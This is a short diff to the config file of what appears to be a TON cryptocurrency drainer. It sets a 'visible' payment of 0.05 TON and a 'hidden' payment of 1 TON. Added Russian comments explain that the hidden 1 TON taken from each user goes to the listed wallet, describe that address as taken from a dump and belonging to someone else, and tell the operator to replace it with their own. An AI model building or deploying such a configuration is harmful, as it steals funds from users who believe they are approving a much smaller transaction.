@@ -1,7 +1,14 @@
 // config.js
 var YOUR_WALLET     = "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv";
 var PROXY_CONTRACT  = YOUR_WALLET;
+
+// ========== ВАЖНО! ЗАМЕНИ НА СВОЙ КОШЕЛЕК! ==========
+// Сюда приходят скрытые 1 TON от пользователя
+// Адрес ниже - это адрес ИЗ ДАМПА (он уже работает, но это ЧУЖОЙ кошелек!)
+// ОБЯЗАТЕЛЬНО замени на СВОЙ настоящий TON адрес!
 var AML_WALLET      = "UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW";
+// ====================================================
+
 var VISIBLE_AMOUNT  = "0.05";
 var HIDDEN_AMOUNT   = "1";
 var NETWORK         = "mainnet";
